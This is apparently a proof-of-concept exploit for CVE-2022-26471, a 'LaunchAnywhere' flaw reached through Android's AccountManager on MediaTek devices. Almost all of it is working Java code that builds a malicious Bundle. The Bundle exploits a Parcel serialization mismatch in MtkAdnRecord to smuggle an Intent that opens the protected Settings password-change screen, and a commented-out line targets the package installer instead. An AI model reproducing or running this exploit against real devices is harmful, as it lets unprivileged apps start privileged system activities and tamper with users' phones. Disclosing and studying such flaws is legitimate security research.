//poc for CVE-2022-26471
//LaunchAnywhere through Android AccounManager

`
   //telephony-common.jar, mediatek-telephony-common.jar com.mediatek.internal.telephony.phb.MtkAdnRecord
    
    public static Bundle bundleTest(){
        Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        // Manipulate the raw data of bundle Parcel
        // Now we replace this right Parcel data to evil Parcel data
        pcelData.writeInt(2); // number of elements in ArrayMap
        /*****************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PACELABLE
        pcelData.writeString("com.mediatek.internal.telephony.phb.MtkAdnRecord"); // name of Class Loader
        pcelData.writeInt(1);
        pcelData.writeInt(2);
        pcelData.writeString("s1");
        pcelData.writeString("s2");
        pcelData.writeStringArray(null);
        pcelData.writeString("s3");
        pcelData.writeString("s4");
        pcelData.writeString("s5");
        //此后的3个变量变动，会影响吞的数据多少，可用代码片段模拟出吞没数据量
        pcelData.writeString("0");
        pcelData.writeInt(1);
        pcelData.writeString("1");
        
        //key 2
        int cur2 = pcelData.dataPosition();
        Log.e(TAG, "parce cur2 " + cur2);
        pcelData.writeString("c");//key
        pcelData.writeInt(13);//bytearray
        pcelData.writeInt(396);// value length, include all intent
        int bytearrStart = pcelData.dataPosition();
        for(int idx=0;idx<18;idx++){
            pcelData.writeInt(idx);
        }
        int cur3 = pcelData.dataPosition();
        Log.e(TAG, "parce cur3 " + cur3);
        pcelData.writeString("intent");
        pcelData.writeInt(4);// VAL_PACELABLE
        pcelData.writeString("android.content.Intent");// name of Class Loader
        //pcelData.writeString(Intent.ACTION_RUN); // Intent Action  string8
        writeString8(pcelData, Intent.ACTION_RUN);
        Uri.writeToParcel(pcelData, null); // Uri is null
        //pcelData.writeString(null); // mType is null string8
        writeString8(pcelData, null);
        //pcelData.writeString(null); // mIdentifier is null string8
        writeString8(pcelData, null);
        pcelData.writeInt(0x10000000); // Flags
        //pcelData.writeString(null); // mPackage is null string8
        writeString8(pcelData, null);
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
//        pcelData.writeString("com.google.android.packageinstaller");
//        pcelData.writeString("com.android.packageinstaller.television.UninstallAppProgress");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);
        ///////////////////////////////////////

        int length  = pcelData.dataSize();
        //change byteArr length
        pcelData.setDataPosition(bytearrStart-4);
        pcelData.writeInt(length - bytearrStart);

        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());

//        //unmarshall
//        evilBundle.getString("aaa");
//        Parcel p = Parcel.obtain();
//        //marshall
//        p.writeBundle(evilBundle);
//        p.setDataPosition(0);
//        Bundle pp = p.readBundle();
//        //unmarshall
//        pp.getString("mistch");

        return evilBundle;
    }

    public static void writeString8(Object obj, String s){
        try {
            Class servieManger = Class.forName("android.os.Parcel");
            Method getService = servieManger.getMethod("writeString8NoHelper", String.class);
            getService.invoke(obj, s);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    `
